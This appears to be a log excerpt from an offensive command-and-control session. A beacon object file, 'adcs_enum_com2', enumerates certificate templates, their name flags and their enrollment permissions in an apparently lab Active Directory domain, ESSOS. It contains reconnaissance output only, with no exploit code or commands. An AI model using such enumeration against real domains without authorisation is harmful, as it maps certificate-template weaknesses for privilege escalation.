+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      N/A
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'OfflineRouter'
+    Template Name            : OfflineRouter
+    Template Friendly Name   : Router (Offline request)
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'SmartcardLogon'
+    Template Name            : SmartcardLogon
+    Template Friendly Name   : Smartcard Logon
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Smart Card Logon
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'SmartcardUser'
+    Template Name            : SmartcardUser
+    Template Friendly Name   : Smartcard User
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectNameRequireEmail SubjectAlternativeNameRequireUPN SubjectAlternativeNameRequireEmail
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPublishToDS
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Secure Email
+      Client Authentication
+      Smart Card Logon
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+     Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'SubCA'
+    Template Name            : SubCA
+    Template Friendly Name   : Subordinate Certification Authority
+    Validity Period          : 5 years (157680000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      N/A
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'CTLSigning'
+    Template Name            : CTLSigning
+    Template Friendly Name   : Trust List Signing
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Microsoft Trust List Signing
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'User'
+    Template Name            : User
+    Template Friendly Name   : User
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectNameRequireEmail SubjectAlternativeNameRequireUPN SubjectAlternativeNameRequireEmail
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPublishToDS EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Encrypting File System
+      Secure Email
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'UserSignature'
+    Template Name            : UserSignature
+    Template Friendly Name   : User Signature Only
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectNameRequireEmail SubjectAlternativeNameRequireUPN SubjectAlternativeNameRequireEmail
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Secure Email
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0
+E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'WebServer'
+    Template Name            : WebServer
+    Template Friendly Name   : Web Server
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Server Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'Workstation'
+    Template Name            : Workstation
+    Template Friendly Name   : Workstation Authentication
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Computers (S-1-5-21-76206382-3835729989-2750497531-515)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+adcs_enum_com2 SUCCESS.
+[02/01 00:14:26] [+] BOF finished
+
++--- Task [7c117b62] closed ----------------------------------------------------------+
